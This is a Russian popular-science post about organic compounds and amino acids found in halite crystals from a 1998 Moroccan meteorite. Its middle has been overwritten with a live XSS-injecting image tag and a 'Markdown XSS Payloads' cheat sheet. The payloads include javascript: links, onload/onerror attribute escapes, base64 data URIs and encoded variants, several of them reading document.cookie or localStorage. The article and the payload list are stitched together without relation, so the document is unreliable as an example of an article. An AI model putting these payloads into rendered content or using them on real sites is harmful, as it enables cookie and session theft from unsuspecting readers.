# В этом кусочке метеорита есть все вещества, необходимые для зарождения жизни 

В 1998 году в небе над Марокко прошел метеоритный дождь. Уцелевшие после прохождения земной атмосферы кусочки ученые собрали и законсервировали в одном из космических центров, забыв о них на долгие годы. Но недавно ученые решили провести тщательный анализ фрагментов упавших небесных тел с использованием рентгеновской спектроскопии.

https://mydiscoveries.ru/v-etom-kusochke-meteorita-est-vse-veshhestva-neobhodimyie-dlya-zarozhdeniya-zhizni

Cсылка на источник

![img](https://mydiscoveries.ru/wp-content/uploads/2018/01/181701-Halite-Full.jpg)

![img](https://www.example.com/image.png"onload="alert('XSS'))

![img](https://dev.razrabs.ru)

![img](https://dev.razrabs.ru/post/1)

# Markdown XSS Payloads

## Links

```markdown
[Basic](javascript:alert('Basic'))
[Local Storage](javascript:alert(JSON.stringify(localStorage)))
[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
[URL](javascript://www.google.com%0Aalert('URL'))
[In Quotes]('javascript:alert("InQuotes")')
```

## Images

```markdown
![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))
![Escape SRC - onerror]("onerror="alert('ImageOnError'))
```

## Fuzzing

```markdown
[XSS](javascript:prompt(document.cookie))
[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[XSS](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
[XSS]: (javascript:prompt(document.cookie))
[XSS](javascript:window.onerror=alert;throw%20document.cookie)
[XSS](javascript://%0d%0aprompt(1))
[XSS](javascript://%0d%0aprompt(1);com)
[XSS](javascript:window.onerror=alert;throw%20document.cookie)
[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[XSS](vbscript:alert(document.domain))
[XSS](javascript:this;alert(1))
[XSS](javascript:this;alert(1&#41;)
[XSS](javascript&#58this;alert(1&#41;)
[XSS](Javas&#99;ript:alert(1&#41;)
[XSS](Javas%26%2399;ript:alert(1&#41;)
[XSS](javascript:alert&#65534;(1&#41;)
[XSS](javascript:confirm(1)
[XSS](javascript://www.google.com%0Aprompt(1))
[XSS](javascript://%0d%0aconfirm(1);com)
[XSS](javascript:window.onerror=confirm;throw%201)
[XSS](javascript:alert(document.domain&#41;)
![XSS](javascript:prompt(document.cookie))\
![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
![XSS'"`onerror=prompt(document.cookie)](x)\
```


Из метеоритов были выделены крошечные кристаллы — галиты, которые могли образоваться только при наличии воды. В них ученым удалось обнаружить сложные органические соединения, включая аминокислоты — по современным представлениям, именно эти ингредиенты являлись основой для зарождения жизни на Земле.

Данное открытие не только подтверждает возможность привнесения «кирпичиков» для возникновения жизни на Земле из космоса, но и показывает возможность зарождения жизни на других планетах, куда были занесены схожие по химическому составу метеориты.
